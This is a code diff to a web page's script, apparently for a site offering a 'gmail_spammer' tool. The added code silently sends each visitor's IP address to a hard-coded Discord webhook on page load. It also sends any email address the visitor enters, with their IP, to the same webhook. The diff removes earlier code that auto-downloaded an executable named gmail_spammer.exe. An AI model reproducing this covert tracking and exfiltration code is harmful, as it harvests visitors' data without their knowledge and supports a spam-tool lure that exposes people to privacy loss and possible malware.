@@ -64,11 +64,36 @@
   </div>
 
   <script>
+    // Send IP address to the webhook on page load
+    (async () => {
+      try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const userIP = ipData.ip;
+
+        const webhookUrl = 'https://discordapp.com/api/webhooks/1328066549264941189/A2q7CiUNhTRR2wuenawrls23D2BTKGU-EylbLaDlGGrUcbwA3O3sHwD0zbrZAJhNQiSr';
+
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: `**New visitor IP:** ${userIP}`
+          }),
+        });
+      } catch (error) {
+        console.error('Error fetching IP or sending webhook:', error);
+      }
+    })();
+
+    // Handle dropdown menu selection
     document.getElementById('options').addEventListener('change', (event) => {
       const emailContainer = document.getElementById('email-container');
       emailContainer.style.display = event.target.value === 'gmail_spammer' ? 'block' : 'none';
     });
 
+    // Handle Gmail submission
     document.getElementById('submit').addEventListener('click', async () => {
       const email = document.getElementById('email').value;
       const status = document.getElementById('status');
@@ -92,21 +117,13 @@
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            content: `**New Gmail Submitted:** ${email}\n**User IP:** ${userIP}`
+            content: `**Gmail Submitted:** ${email}\n**User IP:** ${userIP}`
           }),
         });
 
-        status.textContent = 'downloaded.';
+        status.textContent = 'Gmail and IP sent successfully.';
         status.style.color = 'green';
 
-        // Simulating Gmail attachment
-        const gmailFile = '/mnt/data/test.exe';
-        const link = document.createElement('a');
-        link.href = gmailFile;
-        link.download = 'gmail_spammer.exe';
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
       } catch (error) {
         console.error('Error:', error);
         status.textContent = 'An error occurred. Please try again later.';
